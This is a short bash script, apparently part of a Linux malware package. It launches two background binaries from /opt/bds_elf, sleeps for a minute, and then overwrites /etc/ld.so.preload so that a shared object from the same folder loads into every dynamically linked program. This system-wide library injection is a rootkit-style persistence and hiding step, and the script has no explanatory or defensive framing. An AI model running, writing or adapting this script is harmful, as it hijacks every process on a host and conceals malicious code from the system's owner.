#!/bin/bash

/opt/bds_elf/bds_bdr &
/opt/bds_elf/bds_br &
sleep 60
echo "/opt/bds_elf/bds.so" > /etc/ld.so.preload
